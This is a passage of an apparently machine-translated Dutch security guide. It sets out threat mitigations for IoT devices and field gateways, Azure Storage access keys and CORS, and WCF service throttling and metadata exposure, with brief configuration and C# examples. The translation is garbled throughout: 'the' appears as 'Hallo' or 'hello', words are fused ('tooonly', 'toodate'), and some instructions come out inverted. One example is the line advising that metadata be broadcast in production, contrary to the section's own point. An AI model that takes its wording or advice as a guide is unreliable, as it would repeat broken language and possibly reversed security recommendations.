| **Stappen** | Beheerdersrechten interfaces voor dat apparaat Hallo of veld gateway zichtbaar gemaakt moeten worden beveiligd met sterke referenties. Ook andere blootgestelde interfaces, zoals Wi-Fi, SSH, bestandsshares, FTP moet zijn beveiligd met sterke referenties. De standaardwaarde is zwakke wachtwoorden niet mogen worden gebruikt. |

## <a id="unknown-exe"></a>Zorg ervoor dat onbekende code kan niet worden uitgevoerd op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Beveiligd opstarten en BitLocker Apparaatversleuteling op Windows 10 IoT Core inschakelen](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Stappen** | Beveiligd opstarten van UEFI beperkt Hallo system tooonly uitvoering van de binaire bestanden die zijn ondertekend door een opgegeven instantie. Deze functie voorkomt u dat onbekende code wordt uitgevoerd op Hallo-platform en mogelijk verzwakken Hallo beveiligingspostuur ervan. Schakel UEFI beveiligd opstarten en Hallo lijst met certificeringsinstanties die vertrouwd worden voor ondertekening van programmacode beperken. Meld u aan alle code die is geïmplementeerd op Hallo-apparaat met een Hallo vertrouwde certificeringsinstanties. |

## <a id="partition-iot"></a>Besturingssysteem en de extra partities van IoT-apparaat met BitLocker coderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van BitLocker Apparaatversleuteling, sterk afhankelijk van Hallo aanwezigheid van een TPM op Hallo-platform is, inclusief Hallo nodig preOS protocol in UEFI die Hallo nodig metingen voert. Deze metingen preOS Zorg ervoor dat Hallo die OS later een definitieve record heeft van hoe Hallo OS is gestart. Versleutelen OS partities waarvoor de BitLocker en eventuele extra partities die ook als ze geen gevoelige gegevens opslaan. |

## <a id="min-enable"></a>Zorg ervoor dat alleen Hallo minimale services en-functies zijn ingeschakeld op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Inschakelen of uitschakelen van alle functies of services in Hallo besturingssysteem dat is niet vereist voor het Hallo Hallo-oplossing werkt niet. Voor bijvoorbeeld als Hallo-apparaat een gebruikersinterface toobe geïmplementeerd niet vereist, installeert u Windows IoT Core in headless-modus. |

## <a id="field-bit-locker"></a>Besturingssysteem en de extra partities van IoT-Veldgateway met BitLocker coderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Veld IoT Gateway | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van BitLocker Apparaatversleuteling, sterk afhankelijk van Hallo aanwezigheid van een TPM op Hallo-platform is, inclusief Hallo nodig preOS protocol in UEFI die Hallo nodig metingen voert. Deze metingen preOS Zorg ervoor dat Hallo die OS later een definitieve record heeft van hoe Hallo OS is gestart. Versleutelen OS partities waarvoor de BitLocker en eventuele extra partities die ook als ze geen gevoelige gegevens opslaan. |

## <a id="default-change"></a>Zorg dat Hallo standaard aanmeldingsreferenties van Hallo veldgateway zijn gewijzigd tijdens de installatie

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Veld IoT Gateway | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Zorg dat Hallo standaard aanmeldingsreferenties van Hallo veldgateway zijn gewijzigd tijdens de installatie |

## <a id="cloud-firmware"></a>Zorg ervoor dat Hallo Cloudgateway implementeert een proces tookeep Hallo verbonden apparaten firmware up toodate

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-Cloudgateway | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | Keuze van de gateway - Azure IoT Hub |
| **Verwijzingen**              | [Overzicht van IoT Hub apparaat Management](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [hoe tooupdate Firmware apparaat](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Stappen** | LWM2M is een protocol van Hallo Open Mobile Alliance voor het beheer van IoT-apparaten. Azure IoT-Apparaatbeheer kunt toointeract met fysieke apparaten met behulp van apparaattaken. Zorg ervoor dat Hallo Cloudgateway implementeert een proces tooroutinely behouden Hallo apparaat en andere configuratiegegevens van toodate met Apparaatbeheer via Azure IoT Hub. |

## <a id="controls-policies"></a>Zorg ervoor dat apparaten beveiligingsmechanismen eindpunt geconfigureerd volgens het organisatiebeleid

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Een grens machine vertrouwensrelatie | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Zorg dat apparaten eindpunt beveiligingsmaatregelen zoals BitLocker voor schijfniveau versleuteling, antivirus met bijgewerkte handtekeningen hebben, gebaseerde firewall, upgrades voor het besturingssysteem host, beleid, enzovoort worden geconfigureerd volgens het beveiligingsbeleid voor organisatie-groep. |

## <a id="secure-keys"></a>Zorg ervoor dat veilig beheer van Azure opslagtoegangssleutels

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Azure Storage-beveiligingshandleiding - het beheren van uw sleutels van Opslagaccount](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Stappen** | <p>Opslag van sleutels: Het wordt aanbevolen toostore hello Azure toegangssleutels voor opslag in Azure Key Vault als een geheim en Hallo toepassingen Hallo-sleutel ophalen uit de sleutelkluis hebt. Dit wordt aanbevolen vanwege toohello volgende redenen:</p><ul><li>Hallo-toepassing heeft nooit Hallo opslag sleutel vastgelegd in een configuratiebestand, waardoor er iemand toegang toohello sleutels zonder specifieke machtiging ophalen die doorverwezen</li><li>Toegangstoetsen toohello kunnen worden beheerd met Azure Active Directory. Dit betekent dat de eigenaar van een account kunt verlenen toegang toohello handvol toepassingen die tooretrieve Hallo sleutels van Azure Sleutelkluis moeten. Andere toepassingen worden niet kunnen tooaccess Hallo sleutels zonder deze machtiging verlenen specifiek</li><li>Toegangssleutel wordt opnieuw gegenereerd: Het is raadzaam een proces in place tooregenerate toegang tot Azure-opslag toohave sleutels uit veiligheidsoverwegingen. Meer informatie over waarom en hoe tooplan voor sessiesleutels zijn gedocumenteerd in hello Azure Storage-beveiligingshandleiding verwijzen naar artikel</li></ul>|

## <a id="cors-storage"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de Azure-opslag

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [CORS-ondersteuning voor hello Azure Storage-Services](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Stappen** | Azure-opslag kunt u tooenable CORS – Cross-Origin-resources delen. Voor elke storage-account, kunt u domeinen die toegang bronnen in het opslagaccount Hallo tot opgeven. CORS is standaard uitgeschakeld op alle services. U kunt CORS inschakelen met behulp van Hallo REST-API of Hallo opslag client bibliotheek toocall een Hallo methoden tooset Hallo beleid. |

## <a id="throttling"></a>Functie beperking van WCF-service inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | .NET framework 3 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Voeg Koninkrijk](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Stappen** | <p>Plaatsen niet een limiet op Hallo van systeem bronnen kunnen leiden tot uitputting van bronnen en uiteindelijk denial of service gebruiken.</p><ul><li>**UITLEG:** Windows Communication Foundation (WCF) biedt Hallo mogelijkheid toothrottle-serviceaanvragen. Te veel clientaanvragen toestaan kunt overspoelen van een systeem en de bronnen. Op Hallo daarentegen, zodat slechts een klein aantal aanvragen tooa service kunt voorkomen dat legitieme gebruikers met behulp van Hallo-service. Elke service moet afzonderlijk regelmatig tooand geconfigureerd tooallow Hallo passende hoeveelheid resources.</li><li>**AANBEVELINGEN** van inschakelen WCF-service functie en limieten instellen die geschikt zijn voor uw toepassing.</li></ul>|

### <a name="example"></a>Voorbeeld
Hallo Hier volgt een voorbeeldconfiguratie met beperking ingeschakeld:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-openbaarmaking via metagegevens

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | .NET framework 3 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Voeg Koninkrijk](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Stappen** | Metagegevens kunt aanvallers meer over Hallo systeem en het plannen van een formulier van een aanval. WCF-services kunnen de geconfigureerde tooexpose metagegevens zijn. Metagegevens gedetailleerde beschrijving informatie geeft en niet moet worden uitgezonden in productieomgevingen. Hallo `HttpGetEnabled`  /  `HttpsGetEnabled` eigenschappen van Hallo ServiceMetaData klasse definieert of Hallo metagegevens zal worden blootgesteld aan een service | 

### <a name="example"></a>Voorbeeld
Hallo-code hieronder Hiermee geeft u WCF toobroadcast metagegevens van een service
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Uitzenden metagegevens in een productieomgeving. Hallo HttpGetEnabled instellen / eigtenschap eigenschappen van Hallo ServiceMetaData toofalse klasse. 

### <a name="example"></a>Voorbeeld
Hallo-code hieronder Hiermee geeft u WCF toonot uitzenden van een service-metagegevens. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
